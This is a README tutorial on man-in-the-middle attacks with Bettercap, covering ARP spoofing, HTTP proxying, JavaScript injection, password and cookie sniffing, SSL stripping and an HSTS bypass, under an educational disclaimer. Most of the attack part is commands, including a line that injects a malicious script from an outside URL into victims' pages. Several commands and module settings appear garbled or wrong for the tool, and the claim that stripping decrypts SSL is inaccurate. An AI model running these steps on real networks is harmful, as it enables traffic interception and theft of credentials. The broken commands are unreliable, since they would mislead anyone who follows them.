# MITM Attack using Bettercap

This project demonstrates a **Man-in-the-Middle (MITM)** attack using **Bettercap**, a powerful network tool that allows penetration testers and security researchers to perform various types of attacks, including packet sniffing, ARP spoofing, and more. This guide explains how to use Bettercap to intercept and manipulate network traffic between a victim machine and a server.

> **Disclaimer**: This repository is for educational purposes only. Always ensure you have proper authorization before testing any network. Unauthorized access to computer networks is illegal and unethical.

## Prerequisites

Before starting, make sure you have the following tools and configurations:

- **Bettercap** installed on your system.
- A **Linux-based** system (Ubuntu preferred) for ease of installation and use.
- A **target machine** (victim) to intercept network traffic.
- Basic knowledge of networking concepts such as ARP and routing.

### Install Bettercap

You can install Bettercap on your system by following the instructions below.

#### On Ubuntu (Linux):

```bash
sudo apt update
sudo apt install bettercap
```
Performing MITM Attack
Step 1: Start Bettercap
Once Bettercap is installed, open a terminal and run the following command:

```bash
sudo bettercap -i eth0
```
Note: Replace eth0 with the network interface you're using. You can check your interfaces with ifconfig or ip a.
This command will start Bettercap and set up your machine to monitor the network traffic.
Step 2: Enable ARP Spoofing
To perform a MITM attack, you need to poison the ARP cache of the victim. This will trick the victim into thinking your machine is the router (or any other target). To enable ARP spoofing, use the following command:
```bash
sudo bettercap -X -I eth0
```
This command will begin the ARP poisoning process and start intercepting the traffic between the victim and the server.
## Step 3: Monitor Traffic
You can now monitor the traffic flowing between the victim and the target. To do this, use the following commands:

```bash
net.probe on
```
This will show all active devices on the network. To capture HTTP traffic, you can also enable HTTP proxy:

```bash
http.proxy on
```
With this, Bettercap will proxy HTTP requests and responses, allowing you to inspect and even modify the traffic.

## Step 4: Manipulate Traffic (Optional)
Bettercap provides a wide range of capabilities for manipulating traffic, such as:

- Injecting custom HTML/JavaScript into web traffic.
- Changing HTTP responses.
- Sniffing passwords and cookies.
For example, you can inject content into HTTP responses:
```bash
http.injectjs https://example.com/js/some-malicious-script.js
```
Or log HTTP requests:

```bash
http.caplets on
```
## Step 5: Stop the Attack
Once you’re done, stop the MITM attack by pressing ```Ctrl+C``` in the terminal. This will halt the Bettercap process and restore the normal ARP table on the network.

# HTTPS and HSTS Bypass Using Bettercap

### 1. Start Bettercap
Begin by launching Bettercap with the appropriate network interface. In this example, we use eth0 as the network interface, but you may need to replace it with your own network interface (e.g., wlan0 for Wi-Fi).

```bash
sudo bettercap -iface eth0
```
### 2. Enable HTTP/HTTPS Proxying
To perform SSL stripping (bypass HTTPS) and capture unencrypted traffic, enable the HTTP proxying module. This allows Bettercap to act as a man-in-the-middle and decrypt SSL traffic.

```bash
set net.sniff.proxy true
set net.sniff.proxy.sslstrip true
```
### 3. Disable HSTS (HTTP Strict Transport Security)
To bypass HSTS, which forces websites to use HTTPS, you can use Bettercap's HSTS bypass feature. This helps in injecting HSTS-bypassing packets to manipulate HTTPS responses.

```bash
set net.sniff.inject_hsts_bypass true
```
### 4. Start Sniffing and Logging Traffic
Now, you can start sniffing traffic on the network. Bettercap will capture all the packets, including those stripped from SSL:

```bash
net.sniff on
```
If you want to save the captured data, you can store it in a .pcap file for later analysis:

```
net.sniff.save /path/to/logs.pcap
```
### 5. Analyze the Captured Traffic
Once you have captured the network traffic, you can analyze the ```.pcap``` file with tools like Wireshark. This will allow you to see all the unencrypted HTTP requests and responses that were originally secured by HTTPS.
These commands will enable Bettercap to strip SSL from HTTPS connections and forward the plaintext HTTP traffic.

## Ethical Considerations
This guide demonstrates how an attacker might intercept network traffic, but it should only be used in a controlled environment, such as a penetration test with permission or within a lab setup. Unauthorized use of MITM attacks against networks without permission is illegal.


## Conclusion

Bypassing HTTPS and HSTS protections is a powerful technique for penetration testing and network security analysis. Using Bettercap, you can intercept HTTPS traffic by stripping SSL and bypassing HSTS protections to observe and manipulate network communications. While this method is highly effective for educational purposes, it's crucial to always perform such activities within a legal and ethical framework. Always ensure you have explicit permission to test and analyze network security, and restrict these techniques to controlled environments like Capture The Flag (CTF) challenges or your own network setups.

By mastering tools like Bettercap, you gain valuable insights into network security vulnerabilities and better understand how attackers might exploit these weaknesses. As a security professional, your responsibility is to use this knowledge to strengthen systems and protect sensitive data.

